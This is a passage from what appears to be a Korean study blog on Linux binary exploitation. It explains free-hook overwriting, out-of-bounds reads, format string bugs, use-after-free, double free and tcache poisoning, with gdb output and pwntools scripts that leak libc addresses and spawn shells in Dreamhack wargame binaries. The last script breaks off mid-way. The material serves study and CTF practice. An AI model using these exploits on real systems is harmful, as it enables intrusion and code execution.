결과들로 아래 계산식을 통해 <code>libc_base</code> 의 주소를 얻어낸다.<ul><li>(<code>main</code> 함수의 return address) - (<code>__libc_start_main</code> 함수의 offset) - α = <code>libc_base</code></li></ul></li></ul></li><li><p><code>system</code> 함수와 <code>__free_hook</code> 함수를 치환한다.</p><ul><li><code>__free_hook</code> 함수를 실행하면 <code>system</code> 함수가 실행되도록 hook 함수 주소를 변경한다.</li></ul></li></ol><ul><li>정리하자면<ul><li>조건:<ol><li>buffer overflow가 발생한다.</li><li>프로그램의 바이너리가 필요하다.</li><li>프로그램에서 <code>free</code> 함수를 호출하고, <code>free</code> 함수의 인자를 표준 입력으로 받는다.</li><li>프로그램에서 임의 주소에 임의 값을 덮어쓴다.<pre tabindex=0><code>scanf(&#34;%llu&#34;, &amp;value);
*addr = value;
</code></pre><ul><li>got 를 수정할 수 없기 때문에 ROP 와 비교했을 때 조건이 하나 더 추가된다.</li></ul></li><li>main 함수의 <code>stack frame</code> 의 <code>return address</code> 추출이 가능해야 한다.<ul><li><code>libc_base</code> 를 확인하는데 사용하므로, 다른 방법으로 대체 가능</li></ul></li><li>프로그램에 사용된 libc 라이브러리가 필요하다.</li></ol></li><li>단계:<ol><li>바이너리를 <code>gdb</code> 로 분석하여 <code>main</code> 함수가 <code>__libc_start_main</code> 함수의 몇 번째 라인에서 호출되는지 확인한다.</li><li>프로그램의 ELF 를 확인하여 프로그램을 실행시키고, buffer overflow로 main 함수의 stack frame 에서 return address 값을 출력시킨다.</li><li>출력된 주소값으로 libc_base 를 구한다.</li><li>libc_base 값으로 <code>system</code>, <code>__free_hok</code> 함수와 <code>"/bin/sh"</code> 문자열의 주소를 구한다.</li><li>조건 (4) 에 해당하는, &lsquo;표준입력&rsquo; 을 받는 코드에서 <code>__free_hook</code> 함수의 symbol 주소에 <code>system</code> 함수의 symbol 주소를 대입한다.</li><li>프로그램에서 호출된 <code>free</code> 함수의 인자에 <code>"/bin/sh"</code> 문자열의 주소를 대입한다.</li></ol></li></ul></li></ul><h5 id=exploit-예시>exploit 예시<a hidden class=anchor aria-hidden=true href=#exploit-예시>#</a></h5><pre tabindex=0><code>from pwn import *

p = process(&#39;./fho&#39;)
e = ELF(&#39;./fho&#39;)
libc = ELF(&#39;./libc-2.27.so&#39;)

BUF_SIZE = 0x30

##########
# 1. leak memory of &#39;main&#39; function
##########
payload = b&#39;A&#39; * (BUF_SIZE + 8 + 8 + 8) # BUFFER + other local variable + canary + SFP
p.sendafter(&#39;Buf: &#39;, payload)

print(p.recvuntil(payload))  # payload 값 버리기
addr_main_return = u64(p.recvn(6).ljust(8,b&#39;\x00&#39;))  # main 함수의 stack frame 의 return 주소

##########
# 2. calculate offsets of &#39;__libc_start_main&#39; function
##########
# gdb 에서 확인 한 main 함수의 __libc_start_main 에서의 offset 은 231 이다
# 0x7ffff7a03c87 &lt;__libc_start_main+231&gt;:      mov    edi,eax

OFFSET_MAIN = 231 
ADDR_LIBC_START_MAIN = addr_main_return - OFFSET_MAIN  # __libc_start_main 함수의 주소

# readelf -s 명령으로 확인한 __libc_start_main 의 offset 은 0x021b10 였다.
# 2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
# OFFSET_LIBC_START_MAIN = libc.symbols[&#39;__libc_start_main&#39;]
OFFSET_LIBC_START_MAIN = 0x21b10
libc_base = ADDR_LIBC_START_MAIN - OFFSET_LIBC_START_MAIN
addr_system = libc.symbols[&#39;system&#39;] + libc_base  # libc_base 에 offset 합산
addr_free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]  # libc_base 에 offset 합산
addr_bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))  # libc에 위치한 &#34;/bin/sh&#34; 문자열의 위치 추출 후 주소 계산

print(&#39;libc_base:&#39;, hex(libc_base),  &#39;\naddr_free_hook:&#39;, hex(addr_free_hook), &#39;\naddr_system:&#39;, hex(addr_system), &#39;\naddr_bin_sh:&#39;, hex(addr_bin_sh))


##########
# 3. get shell
##########

# stack 에 값을 직접 채워넣을때는 p64() 함수로 패키징을 한 binary 데이터를 전달헀지만,
# 프로그램에서 정상적으로 변수에 값을 집어게 할 때는 string 형태로 변환해야 한다

input1 = str(addr_free_hook).encode()
print(p.recvuntil(&#39;To write: &#39;))
p.sendline(input1)  # input1
input2 = str(addr_system).encode()
print(p.recvuntil(&#39;With: &#39;))
p.sendline(input2)  # input2
# 코드상 input1(__free_hook) 의 주소를 input2(system) 의 주소로 변경시켜줌

input3 = str(addr_bin_sh).encode()
print(p.recvuntil(&#39;To free:&#39;))
p.sendline(input3)  # __free_hook 함수는 __free_hook(arg1) 형태로 동작하므로, arg1 에 &#34;bin/sh&#34; 를 넣어서 system(&#34;/bin/sh&#34;) 를 만든다.

p.interactive()
</code></pre><h3 id=out-of-bound>Out Of Bound<a hidden class=anchor aria-hidden=true href=#out-of-bound>#</a></h3><ul><li>C 언어에서는 배열을 참조할 때 <code>[]</code> 연산자를 사용한다.</li><li>하지만 C 언어 컴파일러는 <code>[]</code> 연산자 사용시 배열의 범위를 벗어났는지 체크하지 않고, boundary check 는 오직 개발자의 몫이다.</li><li><code>[]</code> 연산자 사용시 boundary check 가 미흡한 코드가 있다면, boundary 를 벗어나는 index 를 넣어 코드의 특정 메모리를 참조할 수 있고, 이러한 공격을 <code>OOB</code>(out of bound) 라 한다.</li><li>예를 들어, 아래 코드를 실행한다고 하자.<pre tabindex=0><code>char* secret = &#34;SECRET KEY&#34;;
char[] arr = {&#34;name&#34;, &#34;age&#34;, &#34;phone&#34;, &#34;address&#34;};
int idx;

scanf(&#34;%d&#34;, &amp;idx);
printf(&#34;%s&#34;, arr[idx]);
</code></pre><ul><li>변수 <code>idx</code> 에 대한 boundary check 가 되어있지 않아 idx 값을 원하는 대로 넣어 같은 주변의 메모리를 참조할 수 있게 된다.</li><li>실행 될 때 stack 을 예로 들면 아래와 같은 형태가 될 것이다.<pre tabindex=0><code>01:0008│-038 0x7fffffffdec8 —▸ 0x555555558040 (secret) ◂— &#39;SECRET KEY\n&#39;
02:0010│-030 0x7fffffffded0 —▸ 0x55555555602d ◂— &#39;name&#39;
03:0018│-028 0x7fffffffded8 —▸ 0x555555556041 ◂— &#39;age&#39;
04:0020│-020 0x7fffffffdee0 —▸ 0x55555555604d ◂— &#39;phone&#39;
05:0028│-018 0x7fffffffdee8 —▸ 0x55555555605b ◂— &#39;address&#39;
</code></pre></li><li><code>arr[0]</code> 은 <code>0x7fffffffded0</code> 주소에 해당하고, <code>arr[-1]</code>은 <code>0x555555558040</code> 주소에 해당하는 값을 반환 한다.</li><li>idx 에 -1 을 넣으면 개발자가 의도하지 않은 변수 값인 <code>secret</code> 변수의 값 &ldquo;SECRET KEY&rdquo; 문자열이 출력되게 할 수 있다.</li></ul></li></ul><h3 id=fsb-format-string-bug>FSB (Format String Bug)<a hidden class=anchor aria-hidden=true href=#fsb-format-string-bug>#</a></h3><ul><li>C 언어에서 문자열을 처리하는 함수 중 f로 끝나는 함수들은 대부분 <code>format string</code> 을 처리하는 함수이다.</li><li><code>format string</code> 이란, %d %s %u 처럼 문자열에 변수를 특정 형식으로 매핑 해 놓은 형태를 의미한다.</li><li><code>format string</code> 을 처리하는 함수는 <code>format string</code> 이 필요로 하는 변수의 갯수를 확인하는 과정이 별도로 없어, 해커들이 이를 이용해 의도하지 않은 변수들을 추가로 출력/입력 하도록 조작할 여지를 만든다.</li></ul><ol><li>printf 를 통한 exploit</li></ol><ul><li>조건:<ul><li><code>printf(변수)</code> 형태의 <code>printf</code> 구문 (argument가 한개)</li><li>취약한 <code>printf</code> 구문이 두 번 이상 호출되어야 함</li><li>프로그램의 바이너리 있어야 함</li></ul></li><li>printf 함수는 출력을 위한 함수이지만, <code>%n</code> 형태의 format string 을 사용하면 입력도 받는 기능이 있다.</li><li>exploit 절차는 다음과 같다.<ol><li><p><code>gdb</code> 를 사용해 바이너리를 분석하여 ELF 로 랜덤하게 배정된 코드 영역의 base 주소를 확인하고 <code>main</code> 함수의 시작 offset 을 구한다.</p><ul><li><p><code>vmmap</code> 명령어로 메모리 영역을 출력 했을 때, 메모리상 코드 영역의 시작부분을 확인한다. (아래 예시에서는 <code>0x555555554000</code> 에 해당)</p><pre tabindex=0><code>              Start                End Perm     Size Offset File
  0x555555554000     0x555555555000 r--p     1000      0 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555555000     0x555555556000 r-xp     1000   1000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555556000     0x555555557000 r--p     1000   2000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555557000     0x555555558000 r--p     1000   2000 /home/aswinblue/download/fsb/fsb_overwrite
  0x555555558000     0x555555559000 rw-p     1000   3000 /home/aswinblue/download/fsb/fsb_overwrite
  0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
  0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
</code></pre></li><li><p><code>start</code> 명령으로 프로그램을 실행시키면 <code>main</code> 함수의 주소가 확인된다. (아래 예시에서는 <code>0x555555555290</code>)</p><pre tabindex=0><code>──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
► 0x555555555290 &lt;main&gt;       endbr64
  0x555555555294 &lt;main+4&gt;     push   rbp
  0x555555555295 &lt;main+5&gt;     mov    rbp, rsp
</code></pre></li><li><p>앞서 <code>vmmap</code> 명령으로 구한 코드 영역의 시작 주소 <code>0x555555554000</code> 와 <code>main</code> 함수의 주소 <code>0x555555555290</code> 를 뺀 차이 <code>0x1290</code> 가 코드 영역에서 <code>main</code> 함수의 offset 이 된다.</p></li></ul></li><li><p>추출이 필요한 target 변수의 메모리 주소를 확인한다.</p><ul><li>리눅스 명령어 <code>readelf -s</code> 로 추출이 필요한 변수의 offset 을 확인 할 수 있다.</li><li>이번 예시에서는 <code>changeme</code> 가 target 변수이다.<pre tabindex=0><code>74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5
75: 000000000000401c     4 OBJECT  GLOBAL DEFAULT   26 changeme
76: 0000000000004010     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
77: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
</code></pre></li><li>target 변수의 offset 은 <code>0x000000000000401c</code> 이므로 (1) 에서 구한 code_base 의 주소를 더해주면 target 변수의 주소는 <code>0x555555554000</code> + <code>0x401c</code> = <code>0x55555555801c</code> 이다.</li><li>(1) 과정에서 <code>main</code> 함수의 시작 주소가 <code>0x555555555290</code> 였으므로, main 함수와 target 변수의 주소 차이는 <code>0x2D8C</code> 이다.</li></ul></li><li><p>stack 상에서 main 함수의 주소를 찾는다.</p><ul><li><code>start</code> 명령으로 프로그램을 실행시키고 <code>main</code> 함수가 <code>printf</code> 함수를 호출하는 시점까지 실행시킨다. (<code>printf@plt</code> 호출 직전까지 실행해야 하며, <code>disass main</code> 명령어로 <code>printf@plt</code> 호출 부분을 확인할 수도 있다.)</li><li><code>tele</code> 명령으로 스택 프레임의 return address 값을 확인해 stack 상에 입력된 <code>main</code> 함수의 주소를 찾을 수 있다.<pre tabindex=0><code>pwndbg&gt; tele 20
00:0000│ rdi rsi rsp 0x7fffffffdef0 ◂— &#39;aaaaaaaa&#39;
01:0008│-028         0x7fffffffdef8 —▸ 0x555555555300 (main+112) ◂— add al, ch
02:0010│-020         0x7fffffffdf00 ◂— 0x0
03:0018│-018         0x7fffffffdf08 —▸ 0x555555555120 (_start) ◂— endbr64
</code></pre></li><li><code>rsp + 8</code> 영역에 main + 112(0x555555555300) 가 들어있음을 확인 할 수 있다.</li><li>target 변수와 main 함수는 <code>0x2D8C</code> = <code>11660</code> 만큼 차이가 나므로, <code>rsp + 8</code> 영역의 주소 <code>0x555555555300</code> 에 <code>11660 - 112</code> 를 더하면 target 변수의 주소가 된다.</li><li>즉, <code>printf</code> 를 호출하기 직전 <code>rsp[8] + 11548</code> 값은 target 변수의 메모리 주소 값이 됨을 알 수 있다.<ul><li><code>ELF</code> 나 <code>ASLR</code> 이 적용되어도 함수 및 변수의 상대적인 주소는 일정하므로 gdb 로 미리 확인하고 pwntool 로 공격이 가능하다.</li></ul></li></ul></li><li><p><code>printf</code> 의 취약점을 활용하여 필요한 메모리 영역을 추출한다.</p><ul><li><code>printf</code> 는 format string 을 첫 번째 인자(rdi)로 받고, 두 번째 이상 부터는 format string 에서 호출 될 변수들을 인자로 받는다.<ul><li><code>printf("%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p");</code> 호출시 결과는 rsi, rdx, rcx, r8, r9, rsp[0], rsp[0x08], rsp[0x10] 에 들어있는 값이 출력된다.</li><li><a href=../../computerscience/computer_science/#sysv>PLT/GOT 참조</a></li></ul></li><li>6번째 변수부터 stack 의 값을 참조하도록 되어있으므로 stack 에 들어있는 메모리 주소를 출력하도록 할 수도 있게 된다.</li><li><code>rsp[8]</code> 는 <code>printf</code> 상에서 <code>%7$p</code> 에 해당한다. (메모리 주소 출력을 해야하므로 &lsquo;%p&rsquo; 를 사용했다.)</li><li><code>printf("%7$p");</code> 를 호출하도록 코드를 짜고, 출력된 값에서 + <code>11548</code> 을 더하면 target 변수의 주소를 추출 해 낼 수 있다.</li></ul></li><li><p><code>printf</code> 의 취약점을 활용하여 메모리 영역에 값을 덮어쓴다.</p><ul><li>추출된 메모리 영역에 값을 덮어 쓰려면, format string 의 <code>%n</code> 기능을 이용한다.<ul><li><code>printf("%s%n");</code> 은 %s 에서 출력된 문자의 길이만큼 <code>%n</code> 에 기록한다.</li><li><a href=../../c++/c++/#format-string>printf 참조</a></li><li>버퍼의 크기가 크지 않아도 큰 수를 <code>%n</code> 에 담으려면 format string 의 width 설정을 이용한다.<ul><li><code>printf("%30p")</code> 는 출력되는 길이가 30 이하라면 모자란 영역을 공백으로 채운다.</li></ul></li></ul></li><li>종합하면 1337 을 target 변수에 덮어쓰고 싶다면, <code>"%1337s%8$n......"</code> 이후에 <code>target 변수의 주소</code> 를 이어붙인 문장을 printf 가 출력하게 하면 된다.<ul><li><code>%1337s%8$n</code> 은 rsp[0x10] 의 주소에 1337 값을 넣는 용도이다.</li><li><code>......</code> + <code>target 변수의 주소</code> 부분은 x64 구조의 시스템에서는 <code>rsp</code>[0x10] 위치에 <code>target 변수의 주소</code> 가 오도록 패딩을 넣은 문자열이다.</li><li>프로그램 상에서 <code>read</code> 함수 호출에서 받은 데이터가 <code>rsp</code> 에 쌓이고 <code>printf</code> 를 호출할 때 까지 <code>rsp</code> 에 유지됨을 <code>gdb</code> 로 확인 했기에 <code>rsp</code>[0x10] 에 데이터를 넣을 계획을 세운 것이다.</li></ul></li></ul></li></ol></li><li>pwntool 을 사용한 코드 예시이다.<pre tabindex=0><code>from pwn import *
p = process(&#34;./fsb_overwrite&#34;)
elf = ELF(&#39;./fsb_overwrite&#39;)
##########
# 1. get address of &#39;main + 112&#39; from stack
##########
# send FSB payload
p.sendline(b&#34;%7$p&#34;)
addr_leak = int(p.recvline()[:-1], 16)

##########
# 2. calculate address main+112 in stack
##########
# calculate address of &#39;main&#39; function
addr_main = addr_leak - 112
print(&#39;addr_main:&#39;, hex(addr_main))
# calculate address of target variable &#39;changeme&#39;
# &#39;changeme&#39; is 11660 away from &#39;main&#39;
# addr_changeme = addr_main + 11660
addr_changeme = addr_main + (elf.symbols[&#39;changeme&#39;] - elf.symbols[&#39;main&#39;])

print(&#39;offset main:&#39;, hex(elf.symbols[&#39;main&#39;]))
print(&#39;offset changeme:&#39;, hex(elf.symbols[&#39;changeme&#39;]))
print(&#39;addr_changeme:&#39;, hex(addr_changeme))

##########
# 3. overwrite &#39;changeme&#39; variable 
##########
payload = b&#34;%1337c%8$n&#34;.ljust(16,b&#39;A&#39;)
payload += p64(addr_changeme)
print(&#39;payload:&#39;, payload)
# 1337 길이의 어떤 문자를 출력하고(무슨 문자가 될지는 모름)
# 1337을 rsp[0x18] 에 덮어쓰게 하기 위해 16자리까지는 FSB 유발 데이터 + dummy string 으로 채우고
# 17자리부터 24자리까지 changeme 변수의 주소로 채운다.
# 이렇게 되면 stack 에서 rsp[0] ~ rsp[16] 까지는 FSB 유발 데이터 + dummy string 이 들어가고
# rsp[17] ~ rsp[24] 까지는 changeme 변수의 주소가 담기게 된다.
p.sendline(payload)

p.interactive()
</code></pre></li></ul><h3 id=use-after-free>Use-After-Free<a hidden class=anchor aria-hidden=true href=#use-after-free>#</a></h3><ul><li><p>메모리를 해제하느라 free 를 호출하면 free 함수는 메모리를 <code>ptmalloc</code> 에 반환할 뿐, 메모리 영역을 초기화 하거나 포인터를 초기화 하지는 않는다.</p><ul><li><a href=../../computerscience/computer_science/#ptmalloc title="pthread malloc">ptmalloc 참조</a></li></ul></li><li><p>free 함수를 호출 한 이후 포인터는 <code>dangling pointer</code> 가 되어 해제된 chunk 영역을 가리키게 된다.</p></li><li><p><code>dangling pointer</code> 를 활용하여 해제된 메모리에 접근하여 발생할 수 있는 보안 취약점을 <code>UAF</code>(<code>Use-After-Free</code>) 라 하며, <code>dangling pointer</code> 가 가리키는 메모리가 해제되기 전에 담고 있었던 데이터가 유출 될 수 있다.</p></li><li><p><code>unsortedbin</code> 의 첫 chunk 는 libc 영역의 특정 구역과 연결된다. 즉, 첫 chunk 의 <code>fd</code> 와 <code>bk</code> 영역에는 libc 영역의 주소가 기록된다는 점을 활용하여 libc_base 를 확인할 수 있다. <a href=../../computerscience/computer_science/#ptmalloc title="pthread malloc">ptmalloc 참조</a></p></li><li><p>exploit 조건</p><ol><li>unsortedbin 에 들어갈 수 있는 크기의 heap 을 할당 할 수 있어야 한다.</li><li>heap 을 원할 때 해제 할 수 있어야 한다. (unsorted bin 의 chunk 와 top chunk 와 붙지 않게 조절 필요)</li><li>uaf 취약점이 있어야 한다. (heap 에서 함수 포인터 주소를 읽어 실행하는 구문 존재)</li><li>실행파일 및 소스코드 확보</li></ol></li><li><p>exploit 방법</p><ol><li><p>libc_base 와 특정 메모리의 <code>fd</code> 혹은 <code>bk</code> 간 거리(index) 를 찾아낸다.</p><ul><li><code>gdb</code>에서 프로그램을 실행시킨 후 메모리를 할당하고 해제하여 <code>unsortedbin</code> 영역에 chunk 를 생성시키고, <code>heap</code> 명령으로 그 chunk 의 <code>fd</code> 나 <code>bk</code> 영역의 메모리를 추출한다. (1024 이상 메모리 할당 필요)</li></ul><pre tabindex=0><code>Free chunk (largebins) | PREV_INUSE
Addr: 0x555555559290
Size: 0x510 (with flag bits: 0x511)
fd: 0x7ffff7fb8010
bk: 0x7ffff7fb8010
fd_nextsize: 0x555555559290
bk_nextsize: 0x555555559290
</code></pre><ul><li><code>vmmap</code> 을 사용해 libc_base 의 주소를 확인한다. (예시에서는 <code>0x7ffff7dcb000</code>)</li></ul><pre tabindex=0><code> 0x555555559000     0x55555557a000 rw-p    21000      0 [heap]
 0x7fff4d31f000     0x7ffff7dcb000 rw-p aaaac000      0 [anon_7fff4d31f]
 0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
 0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]
 0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]
</code></pre><ul><li>libc_base 주소에서 <code>fd</code> 에 저장된 주소를 빼고, 96 의 offset을 추가로 빼서 libc_base 와 <code>fd</code> 가 가리키는 주소 index 를 찾는다. <code>0x7ffff7fb8010</code> - <code>0x7ffff7dcb000</code> = <code>0x1ED010</code></li><li>index 는 상대적인 값이므로 프로그램일 다시 실행시켜 libc_base 의 메모리 주소가 랜덤하게 변경되어도, index 는 변하지 않는다.</li></ul></li><li><p>exploit 에 사용할 ROP chain 을 구한다.</p><ul><li>one-gadget 을 이용할 수도 있다. <code>libc</code> 파일을 one-gadget으로 분석하면 아래와 같다.<pre tabindex=0><code>$ one_gadget /lib/x86_64-linux-gnu/libc.so.6

0xe3afe execve(&#34;/bin/sh&#34;, r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve(&#34;/bin/sh&#34;, r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve(&#34;/bin/sh&#34;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
</code></pre><ul><li>이후 <code>gdb</code> 에서 <code>i r</code> 명령으로 레지스터 상황을 보고 조건에 맞는 one-gadget 을 선택한다.</li></ul><pre tabindex=0><code>i r
i r
rax            0xfffffffffffffe00  -512
rbx            0x3                 3
rcx            0x7ffff7ed91f2      140737352929778
rdx            0x5555513f          1431654719
rsi            0x7fff4d31f010      140734488506384
rdi            0x0                 0
rbp            0x7fffffffdee0      0x7fffffffdee0
rsp            0x7fffffffdeb8      0x7fffffffdeb8
r8             0x6                 6
r9             0x6                 6
r10            0x555555556073      93824992239731
r11            0x246               582
r12            0x555555555140      93824992235840
r13            0x7fffffffdff0      140737488347120
r14            0x0                 0
r15            0x0                 0
rip            0x7ffff7ed91f2      0x7ffff7ed91f2 &lt;__GI___libc_read+18&gt;
eflags         0x246               [ PF ZF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
</code></pre></li></ul></li></ol><ul><li><a href=https://dreamhack.io/wargame/challenges/357>문제</a> 해결 예제 코드<pre tabindex=0><code>from pwn import *

DUMMY_DATA = &#39;A&#39;
OFFSET = 0x3ebca0
ONE_GADGET = 0x10a41c

# p = process(&#39;a.out&#39;, env= {&#34;LD_PRELOAD&#34; : &#34;libc-2.27.so&#34;})

# alloc1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())
p.sendlineafter(b&#34;idx:&#34;, b&#39;-1&#39;)

# alloc2 &amp; free alloc1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())
p.sendlineafter(b&#34;idx:&#34;, b&#39;0&#39;)

# alloc 3 (reuse chunk of &#39;alloc1&#39;)
p.sendlineafter(b&#34;&gt; &#34;, b&#39;3&#39;)
p.sendlineafter(b&#34;Size:&#34;, b&#39;1280&#39;)
p.sendafter(b&#34;Data:&#34;, DUMMY_DATA.encode())

p.recvuntil(b&#39;Data: &#39;)
fd = u64(p.recvline()[:-1].ljust(8, b&#39;\x00&#39;))  # fd 값 추출

p.sendlineafter(b&#34;idx:&#34;, b&#39;-1&#39;) # 잔여 과정 처리

print(&#39;fd:&#39;, hex(fd))
offset = OFFSET + ord(DUMMY_DATA) - (OFFSET&amp;0xFF)  # 덮어쓴 DUMMY_DATA값을 고려하여 계산한다.
print(&#39;offset:&#39;, hex(offset))
libc_base = fd - offset  # 유출된 fd 값으로 libc_base 값 계산
print(&#39;libc_base:&#39;, hex(libc_base))
gadget = libc_base + ONE_GADGET
print(&#39;gadget:&#39;, hex(gadget))

# alloc struct1
p.sendlineafter(b&#34;&gt; &#34;, b&#39;1&#39;)
p.sendlineafter(b&#34;Weight:&#34;, b&#39;1&#39;)
p.sendlineafter(b&#34;Age:&#34;, str(gadget).encode())  # 특정 구역에 gadget 주입

# alloc struct2
p.sendlineafter(b&#34;&gt; &#34;, b&#39;2&#39;)
p.sendlineafter(b&#34;Weight:&#34;, b&#39;1&#39;)
# struct1 의 Age 영역이 strucut2 구역서는 함수 포인터이다. 아까 주입한 gadget 이 실행된다.

p.interactive()                         
</code></pre></li></ul></li></ul><h3 id=doubly-free-bug>Doubly Free Bug<a hidden class=anchor aria-hidden=true href=#doubly-free-bug>#</a></h3><ul><li><code>ptmalloc2</code> 시스템에서 이미 free 를 호출하여 <code>tcache</code> 나 <code>bins</code> 에 포함된 <code>chunk</code> 를 한번 더 free 하여 취약점을 발생시키는 공격 기법이다.</li><li>공격자가 임의의 주소를 read / write / execute 할 수 있고, Denial of Service 도 수행할 수 있다.</li><li>특정 포인터에 대해 free 를 호출한 후 초기화를 하지 않으면 <code>dangling pointer</code> 가 생성된다. <code>dangling pointer</code> 를 한 번 더 free 하게 되면 <code>tcache</code> 나 <code>bin</code> 에 동일한 내용의 새로운 <code>chunk</code> 가 추가된다.<pre tabindex=0><code>1. alloc
    bins      heap
     -      [chunk1]

2. free
    bins      heap
  [chunk1]      -

3. free again
    bins      heap
  [chunk1]      -
  [chunk1]

4. alloc same size
    bins      heap
  [chunk1]   [chunk1]
# 같은 주소 영역이 bin 과 heap 에 둘다 존재
# heap 영역에 있는 [chunk1] 의 fd 위치와 bk 위치를 조작하면 bins 에 임의의 주소를 추가할 수 있다.
</code></pre><ul><li>glibc 2.26에서 많이 사용된 공격 기법이지만, 최신 libc 에서는 중복 free 를 방지하는 코드가 있어, 우회하지 않으면 프로그램이 자동으로 종료된다.<ul><li>free 된 chunk 들은 chunk + 8 영역에 <code>tcache_entry</code> 구조체를 갖게 된다.</li><li><code>tcache_entry</code> 는 free 할 때 <code>tcache_perthread</code> 값으로 설정되고, 할당 될 때 다시 초기화 된다.<ul><li><code>tcache_perthread</code> 는 thread 마다 갖고 있는 구조체로, tcache 에 배정된 chunk list 를 관리한다.</li></ul></li><li>chunk 를 free 할 때 chunk 의 <code>tcache_entry</code> 부분이 <code>tcache_perthread</code> 와 일치하지 않으면 보호기법을 우회할 수 있다.</li></ul><pre tabindex=0><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
  void *chunk = malloc(0x20);
  printf(&#34;Chunk to be double-freed: %p\n&#34;, chunk);
  free(chunk);
  *(char *)(chunk + 8) = 0xff;  // tcache_entry 구조체(chunk-&gt;key) 의 주소를 오염시킨다.
  free(chunk);                  // 변조를 했기 때문에 한 번 더 free 가 가능하다.
  printf(&#34;First allocation: %p\n&#34;, malloc(0x20));
  printf(&#34;Second allocation: %p\n&#34;, malloc(0x20));
  return 0;
}
</code></pre></li></ul></li></ul><h4 id=tcache-poisoning>Tcache Poisoning<a hidden class=anchor aria-hidden=true href=#tcache-poisoning>#</a></h4><ul><li><p><code>Doubly Free Bug</code> 취약점을 활용하여 <code>tcache</code> 를 조작하는 공격 기법이다.</p></li><li><p>2회 이상 free 된 chunk 를 재할달 하면 임의 주소에 chunk 를 할당시키는 (<code>tcache</code> 조작) 할 수 있다.</p><ul><li>AAR(Arbitrary Address Read) : 임의의 주소를 읽을 수 있음</li><li>AAW(Arbitrary Address Write) : 임의의 주소에 쓸 수 있음</li></ul></li><li><p>exploit 방법은 아래와 같다.</p><ul><li><p>조건:</p><ol><li>double free 취약점 존재</li><li>실행파일 및 소스코드 확보</li><li>코드상 <code>stdout</code> 호출<ul><li><code>stdout</code> 은 libc 에 정의된 값으로, 코드상에서 이를 호출하면 <code>.bss</code> 영역에 libc 영역을 가리키는 주소 <code>_IO_2_1_stdout_</code> 가 담기게 된다.</li></ul></li></ol></li><li><p>절차:</p><ol><li><code>AAR</code>(Arbitrary Address Read) 로 libc_base 주소를 추출한다.</li><li><code>AAW</code>(Arbitrary Address Write) 로 hook 을 overwrite 한다.<ul><li><code>readelf -s</code> 로 __free_hook 의 주소를 찾는다.<pre tabindex=0><code>221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
</code></pre></li></ul></li></ol></li><li><p><a href=https://dreamhack.io/wargame/challenges/358/>문제</a> 해결 예제코드</p><pre tabindex=0><code>from pwn import *

PROGRAM = &#39;tcache_poison&#39;
PAYLOAD = &#39;A&#39;
GADGET = 0x4f432

p = process(PROGRAM)
e = ELF(PROGRAM)
lib = ELF(&#39;libc-2.27.so&#39;)

###############
# 1. Doubly free memory
###############
# alloc chunk1
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;1&#39;)
p.sendlineafter(b&#39;Size:&#39;, b&#39;50&#39;)
p.sendafter(b&#39;Content:&#39;, PAYLOAD.encode())

# tcache: (*) -&gt; NULL
# --------------------------

# free chunk1
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)

# tcache: (*) -&gt; chunk1
# --------------------------

# edit chunk1 (already freed)
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;4&#39;)
p.sendafter(b&#39;Edit chunk:&#39;, b&#39;A&#39; * 8 + b&#39;\x00&#39;)  # corrupt tcache_entry to free again

# free chunk1 again &lt;- Doubly Free Bug
p.sendlineafter(b&#39;Edit\n&#39;, b&#39;2&#39;)
# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.
# tcache: (*) -&gt; chunk1 -&gt; chunk1
# --------------------------

###############
# 2. Poison tcache 
###############
offset_stdout = e.symbols[&#39;stdout&#39;]
